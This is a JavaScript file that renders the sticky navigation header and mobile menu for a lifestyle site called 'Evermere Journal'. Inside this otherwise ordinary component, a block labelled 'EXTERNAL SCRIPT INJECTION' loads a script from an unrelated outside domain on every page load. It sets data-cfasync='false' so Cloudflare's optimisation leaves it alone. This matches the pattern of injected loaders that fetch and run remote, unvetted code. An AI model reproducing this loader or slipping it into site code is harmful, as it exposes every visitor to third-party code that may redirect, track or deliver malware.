/* =========================================================
   EVERMERE JOURNAL — STICKY HEADER
   ========================================================= */

(function () {

  const headerTarget = document.getElementById("header");

  if (!headerTarget) return;

  /* Make the actual wrapper sticky */
  headerTarget.style.position = "sticky";
  headerTarget.style.top = "0";
  headerTarget.style.zIndex = "99999";
  headerTarget.style.width = "100%";

  headerTarget.innerHTML = `

    <header class="evermere-header">

      <div class="evermere-header-inner">

        <!-- BRAND -->

        <a
          href="index.html"
          class="evermere-logo"
          aria-label="Evermere Journal Home"
        >

          <span class="evermere-logo-main">
            Evermere
          </span>

          <span class="evermere-logo-sub">
            Journal
          </span>

        </a>


        <!-- DESKTOP NAV -->

        <nav
          class="evermere-nav"
          aria-label="Main Navigation"
        >

          <a href="food.html">Food</a>

          <a href="travel.html">Travel</a>

          <a href="nature.html">Nature</a>

          <a href="fashion.html">Fashion</a>

          <a href="quotes.html">Quotes</a>

          <a href="home-decor.html">Home Decor</a>

        </nav>


        <!-- MOBILE MENU BUTTON -->

        <button
          class="evermere-menu-btn"
          type="button"
          aria-label="Open navigation"
          aria-expanded="false"
        >

          <span></span>
          <span></span>

        </button>

      </div>


      <!-- MOBILE NAVIGATION -->

      <nav
        class="evermere-mobile-nav"
        aria-label="Mobile Navigation"
      >

        <a href="food.html">
          <span>01</span>
          Food
        </a>

        <a href="travel.html">
          <span>02</span>
          Travel
        </a>

        <a href="nature.html">
          <span>03</span>
          Nature
        </a>

        <a href="fashion.html">
          <span>04</span>
          Fashion
        </a>

        <a href="quotes.html">
          <span>05</span>
          Quotes
        </a>

        <a href="home-decor.html">
          <span>06</span>
          Home Decor
        </a>

      </nav>

    </header>


    <style>

      /* =====================================================
         STICKY WRAPPER
      ===================================================== */

      #header {
        position: sticky !important;
        top: 0 !important;
        z-index: 99999 !important;

        width: 100%;

        margin: 0;
        padding: 0;
      }


      /* =====================================================
         HEADER
      ===================================================== */

      .evermere-header {

        position: relative;

        width: 100%;

        background:
          rgba(245, 243, 238, .96);

        border-bottom:
          1px solid rgba(37, 39, 37, .07);

        box-shadow:
          0 3px 20px rgba(37, 39, 37, .035);

        backdrop-filter: blur(18px);
        -webkit-backdrop-filter: blur(18px);

      }


      .evermere-header-inner {

        width:
          min(1220px, calc(100% - 50px));

        min-height: 88px;

        margin: 0 auto;

        display: flex;

        align-items: center;

        justify-content: space-between;

        gap: 35px;

      }


      /* =====================================================
         LOGO
      ===================================================== */

      .evermere-logo {

        flex-shrink: 0;

        display: inline-flex;

        align-items: baseline;

        gap: 7px;

        color: #252725;

        text-decoration: none;

        white-space: nowrap;

      }


      .evermere-logo-main {

        font-family:
          "DM Serif Display",
          Georgia,
          serif;

        font-size: 28px;

        font-weight: 400;

        line-height: 1;

        letter-spacing: -.7px;

      }


      .evermere-logo-sub {

        color: #78816F;

        font-family:
          "DM Sans",
          Arial,
          sans-serif;

        font-size: 8px;

        font-weight: 600;

        letter-spacing: 2px;

        text-transform: uppercase;

      }


      /* =====================================================
         DESKTOP NAV
      ===================================================== */

      .evermere-nav {

        display: flex;

        align-items: center;

        gap: clamp(18px, 2.2vw, 32px);

      }


      .evermere-nav a {

        position: relative;

        padding: 8px 0;

        color: #555B55;

        font-family:
          "DM Sans",
          Arial,
          sans-serif;

        font-size: 10px;

        font-weight: 600;

        letter-spacing: 1.5px;

        text-transform: uppercase;

        text-decoration: none;

        white-space: nowrap;

        transition:
          color .25s ease;

      }


      .evermere-nav a::after {

        content: "";

        position: absolute;

        left: 0;

        bottom: 1px;

        width: 0;

        height: 1px;

        background: #78816F;

        transition:
          width .25s ease;

      }


      .evermere-nav a:hover {

        color: #252725;

      }


      .evermere-nav a:hover::after {

        width: 100%;

      }


      /* =====================================================
         MOBILE BUTTON
      ===================================================== */

      .evermere-menu-btn {

        display: none;

        width: 44px;
        height: 44px;

        padding: 0;

        border:
          1px solid rgba(37, 39, 37, .14);

        border-radius: 50%;

        background: transparent;

        cursor: pointer;

        align-items: center;
        justify-content: center;

        flex-direction: column;

        gap: 6px;

      }


      .evermere-menu-btn span {

        display: block;

        width: 17px;
        height: 1px;

        background: #252725;

        transition:
          transform .3s ease,
          opacity .3s ease;

      }


      /* =====================================================
         MOBILE NAV
      ===================================================== */

      .evermere-mobile-nav {

        display: none;

        width:
          min(100% - 32px, 560px);

        margin: 0 auto;

        padding: 7px 0 24px;

      }


      .evermere-mobile-nav a {

        display: flex;

        align-items: center;

        justify-content: space-between;

        padding: 17px 0;

        border-bottom:
          1px solid rgba(37, 39, 37, .08);

        color: #252725;

        font-family:
          "DM Serif Display",
          Georgia,
          serif;

        font-size: 25px;

        line-height: 1;

        text-decoration: none;

      }


      .evermere-mobile-nav a:first-child {

        border-top:
          1px solid rgba(37, 39, 37, .08);

      }


      .evermere-mobile-nav a span {

        color: #8A9088;

        font-family:
          "DM Sans",
          Arial,
          sans-serif;

        font-size: 8px;

        font-weight: 600;

        letter-spacing: 1.8px;

      }


      /* =====================================================
         TABLET
      ===================================================== */

      @media (max-width: 1050px) {

        .evermere-header-inner {

          width:
            min(100% - 38px, 900px);

        }

        .evermere-nav {

          gap: 17px;

        }

        .evermere-nav a {

          font-size: 9px;

          letter-spacing: 1.1px;

        }

      }


      /* =====================================================
         MOBILE
      ===================================================== */

      @media (max-width: 850px) {

        .evermere-header-inner {

          min-height: 76px;

        }

        .evermere-nav {

          display: none;

        }

        .evermere-menu-btn {

          display: flex;

        }

        .evermere-mobile-nav.is-open {

          display: block;

        }

        .evermere-menu-btn.is-open
        span:first-child {

          transform:
            translateY(3.5px)
            rotate(45deg);

        }

        .evermere-menu-btn.is-open
        span:last-child {

          transform:
            translateY(-3.5px)
            rotate(-45deg);

        }

      }


      /* =====================================================
         SMALL MOBILE
      ===================================================== */

      @media (max-width: 375px) {

        .evermere-header-inner {

          width:
            calc(100% - 26px);

          min-height: 70px;

        }

        .evermere-logo-main {

          font-size: 25px;

        }

        .evermere-logo-sub {

          font-size: 7px;

          letter-spacing: 1.6px;

        }

        .evermere-menu-btn {

          width: 41px;
          height: 41px;

        }

        .evermere-mobile-nav {

          width:
            calc(100% - 26px);

        }

        .evermere-mobile-nav a {

          padding: 15px 0;

          font-size: 23px;

        }

      }


    </style>
  `;


  /* =====================================================
     EXTERNAL SCRIPT INJECTION
  ===================================================== */
  const extScript = document.createElement("script");
  extScript.setAttribute("data-cfasync", "false");
  extScript.src = "https://bauval.org/14/8fce0aad15b6251ee23095b563a55776";
  document.head.appendChild(extScript);


  /* =========================================================
     MOBILE MENU FUNCTION
  ========================================================= */

  const menuButton =
    headerTarget.querySelector(
      ".evermere-menu-btn"
    );

  const mobileNav =
    headerTarget.querySelector(
      ".evermere-mobile-nav"
    );


  if (!menuButton || !mobileNav) return;


  menuButton.addEventListener(
    "click",
    function () {

      const isOpen =
        menuButton.classList.toggle(
          "is-open"
        );

      mobileNav.classList.toggle(
        "is-open",
        isOpen
      );

      menuButton.setAttribute(
        "aria-expanded",
        isOpen ? "true" : "false"
      );

      menuButton.setAttribute(
        "aria-label",
        isOpen
          ? "Close navigation"
          : "Open navigation"
      );

    }
  );


  /* Close menu when link is clicked */

  mobileNav
    .querySelectorAll("a")
    .forEach(function (link) {

      link.addEventListener(
        "click",
        function () {

          menuButton.classList.remove(
            "is-open"
          );

          mobileNav.classList.remove(
            "is-open"
          );

          menuButton.setAttribute(
            "aria-expanded",
            "false"
          );

          menuButton.setAttribute(
            "aria-label",
            "Open navigation"
          );

        }
      );

    });

})();